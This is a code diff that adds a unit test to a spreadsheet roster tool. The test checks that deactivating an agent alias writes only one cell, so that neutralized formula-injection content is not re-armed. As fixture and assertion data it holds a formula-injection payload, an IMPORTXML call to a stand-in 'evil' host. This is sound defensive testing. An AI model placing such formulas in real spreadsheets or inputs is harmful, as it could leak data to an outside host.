@@ -126,3 +126,46 @@ test('roster-add: admin-only; audit sheet is a precondition', function () {
     add({ name: 'X Y', department: 'Alpha', extensions: '200' });
   }, /Orphan Fix Log sheet missing/);
 });
+
+// --- R8-3 (audit 2026-07-21): CORE-7 completion -- deactivate must not
+// round-trip the whole block (getValues -> setValues re-arms neutralized
+// formula cells: the leading apostrophe is FORMATTING, so the read returns
+// the bare "=..." string and a block write re-interprets it as a live
+// formula). Pin: deactivateAgentAlias_ writes ONLY the Active cell.
+test('R8-3: deactivateAgentAlias_ writes only the Active cell (no whole-block setValues)', function () {
+  install();
+  const ALIAS_HEADER = ['Old Name', 'Canonical Name', 'Active', 'Added By', 'Added At', 'Notes'];
+  h.state.spreadsheet = makeFakeSpreadsheet({ timeZone: 'America/Chicago', sheets: {
+    'DO NOT EDIT!': rosterGrid({ Alpha: ['Anna, 201'] }),
+    'Orphan Fix Log': [LOG_HEADER],
+    'Agent Alias Overrides': [
+      ALIAS_HEADER,
+      // A CORE-7-neutralized formula-shaped orphan name in another ROW --
+      // stored content is the bare string (the apostrophe is formatting).
+      ['=IMPORTXML("http://evil","x")', 'Anna', 'TRUE', 'admin@x.com', '', ''],
+      ['Old Bob', 'Anna', 'TRUE', 'admin@x.com', '', 'note'],
+    ],
+  } });
+  const sheet = h.state.spreadsheet._sheet('Agent Alias Overrides');
+  const writes = [];
+  const realGetRange = sheet.getRange.bind(sheet);
+  sheet.getRange = function (r, c, nr, nc) {
+    const range = realGetRange(r, c, nr, nc);
+    const realSetValues = range.setValues.bind(range);
+    range.setValues = function (vals) {
+      writes.push({ r, c, nr: nr || 1, nc: nc || 1, cells: vals.length * vals[0].length });
+      return realSetValues(vals);
+    };
+    return range;
+  };
+  const count = h.call('deactivateAgentAlias_', 'Old Bob');
+  assert.equal(count, 1);
+  assert.equal(writes.length, 1, 'exactly one write');
+  assert.deepEqual({ r: writes[0].r, c: writes[0].c, cells: writes[0].cells },
+    { r: 3, c: 3, cells: 1 }, 'single-cell write at (row 3, Active col 3)');
+  const grid = sheet._data;
+  assert.equal(grid[2][2], 'FALSE', 'target row deactivated');
+  assert.equal(grid[1][2], 'TRUE', 'other row untouched');
+  assert.equal(grid[1][0], '=IMPORTXML("http://evil","x")',
+    'formula-shaped cell content unchanged (and never re-written)');
+});
